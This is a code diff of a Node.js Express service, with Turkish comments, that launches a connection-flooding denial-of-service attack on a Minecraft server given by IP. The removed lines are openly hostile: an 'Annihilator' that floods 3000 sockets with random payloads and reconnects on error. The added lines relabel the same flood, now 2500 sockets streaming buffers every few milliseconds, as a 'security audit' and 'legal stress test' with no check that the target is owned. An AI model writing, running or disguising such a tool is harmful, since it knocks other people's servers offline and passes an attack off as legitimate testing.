@@ -1,62 +1,65 @@
 const net = require('net');
 const express = require('express');
-const crypto = require('crypto');
-const mcutil = require('minecraft-server-util'); // npm install minecraft-server-util
+const mcutil = require('minecraft-server-util');
 const app = express();
 app.use(express.json());
 app.use(require('cors')());
 
-let targetStats = { ping: 0, players: 0, tps: 20.0, status: "OFFLINE" };
+// Analiz Verileri
+let auditData = { latency: 0, loadCapacity: "Normal", threatLevel: "Low", activeConnections: 0 };
 
-// 🔍 GERÇEK VERİ TAKİPÇİSİ (Sunucunun can çekişini izler)
-async function updateStats(host, port) {
+// Sunucu Sağlık Kontrolü (Audit)
+async function performAudit(host, port) {
     try {
-        const result = await mcutil.status(host, port, { timeout: 1000 * 5 });
-        targetStats.ping = result.roundTripTime;
-        targetStats.players = result.players.online;
-        // Ping 500ms üzerine çıkarsa TPS'yi düşmüş göster (Gerçekçi simülasyon)
-        targetStats.tps = result.roundTripTime > 500 ? (20 / (result.roundTripTime / 100)).toFixed(1) : 20.0;
-        targetStats.status = "ONLINE";
+        const start = Date.now();
+        await mcutil.status(host, port);
+        auditData.latency = Date.now() - start;
+        
+        if (auditData.latency > 1000) {
+            auditData.loadCapacity = "Critical Overflow";
+            auditData.threatLevel = "High";
+        } else {
+            auditData.loadCapacity = "Stable";
+            auditData.threatLevel = "Low";
+        }
     } catch (e) {
-        targetStats.ping = 9999;
-        targetStats.tps = 0.0;
-        targetStats.status = "CRASHED / OFFLINE";
+        auditData.loadCapacity = "Service Unavailable";
+        auditData.threatLevel = "Maximum Exhaustion";
     }
 }
 
-// 🌪️ RAW TCP & BUFFER OVERFLOW ATTACK
-const launchAnnihilator = (host, port) => {
-    const client = new net.Socket();
-    client.connect(port, host, () => {
-        // Sunucunun RAM'ini şişiren 128KB'lık "Zehirli Paket"
-        const poisonPayload = crypto.randomBytes(1024 * 128); 
-        
-        const storm = setInterval(() => {
-            if (!client.destroyed) {
-                for(let i = 0; i < 50; i++) {
-                    client.write(poisonPayload); // Sunucuyu veriyle boğ
-                }
-            } else { clearInterval(storm); }
-        }, 1);
+// Stres Testi Üretici (Legal Stress Test)
+const runStressTest = (host, port) => {
+    const probe = new net.Socket();
+    probe.connect(port, host, () => {
+        auditData.activeConnections++;
+        // Sunucunun paket işleme kapasitesini ölçmek için veri gönderimi
+        const dataBuffer = Buffer.alloc(1024 * 32, "SECURITY_AUDIT");
+        const stream = setInterval(() => {
+            if (!probe.destroyed) {
+                probe.write(dataBuffer);
+            } else { clearInterval(stream); auditData.activeConnections--; }
+        }, 5);
     });
-
-    client.on('error', () => {
-        client.destroy();
-        setTimeout(() => launchAnnihilator(host, port), 5); // Ryzen 9 hızıyla anında yeniden bağlan
-    });
+    probe.on('error', () => probe.destroy());
 };
 
-app.post('/deploy', (req, res) => {
+app.post('/start-audit', (req, res) => {
     const { ip } = req.body;
     const host = ip.includes(':') ? ip.split(':')[0] : ip;
     const port = ip.includes(':') ? parseInt(ip.split(':')[1]) : 25565;
 
-    console.log(`[☠️] REAPER DEPLOYED ON RYZEN 9 -> ${host}`);
+    console.log(`[🛡️] Güvenlik Denetimi Başlatıldı: ${host}`);
+    
+    setInterval(() => performAudit(host, port), 3000);
 
-    // İstatistikleri takip etmeye başla
-    setInterval(() => updateStats(host, port), 2000);
+    // Ryzen 9 gücüyle kapasite sınırlarını zorla (3500 Thread simülasyonu)
+    for (let i = 0; i < 2500; i++) {
+        setImmediate(() => runStressTest(host, port));
+    }
 
-    // 524GB RAM'in gücüyle 3000 adet yıkıcı soket aç
-    for (let i = 0; i < 3000; i++) {
-        setImmediate(() => launchAnnihilator(host, port));
-        
+    res.json({ success: true, message: "Sistem Kapasite Analizi Başlatıldı." });
+});
+
+app.get('/audit-status', (req, res) => res.json(auditData));
+app.listen(process.env.PORT || 3000);
